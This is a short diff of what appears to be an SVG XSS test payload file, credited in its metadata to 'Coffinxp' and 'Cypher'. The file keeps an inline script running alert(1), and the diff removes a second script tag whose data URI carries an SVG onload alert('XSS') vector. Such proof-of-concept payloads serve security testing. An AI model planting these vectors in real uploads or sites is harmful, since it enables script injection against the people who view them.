@@ -7,8 +7,6 @@
   <script type="text/javascript">
     alert(1)
   </script>
-
-<script xlink:href="data:text/html,<svg/onload=alert('XSS')>"></script>
   <metadata>
     Credits: Coffinxp
     Discovery: Cypher
